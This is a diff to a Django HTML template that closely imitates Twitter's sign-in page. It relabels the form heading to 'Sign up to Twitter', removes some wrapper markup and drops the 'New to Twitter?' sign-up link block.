@@ -44,12 +44,10 @@
 
 
         <div id="page-outer">
-          <div id="page-container" class="AppContent wrapper wrapper-login">
 
-            <div class="page-canvas">
 
-  <div class="signin-wrapper" data-login-message="">
-    <h1>Log in to Twitter</h1>
+  <div class="signin-wrapper">
+    <h1>Sign up to Twitter</h1>
     <form class="t1-form clearfix signin js-signin" method="post">
     {% csrf_token %}
     <input type="text" name="username" placeholder="Username"/><br/><br/>
@@ -61,13 +59,7 @@
     <button type="submit" class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Sign Up</button>
     </form>
 </div>
-  <div class="clearfix mobile has-sms">
-    <p class="signup-helper">
-      New to Twitter?
-      <a id="login-signup-link" href="https://twitter.com/signup">Sign up now&#32;&raquo;</a>
-    </p>
-  </div>
-            </div>
+        </div>
           </div>
 
 
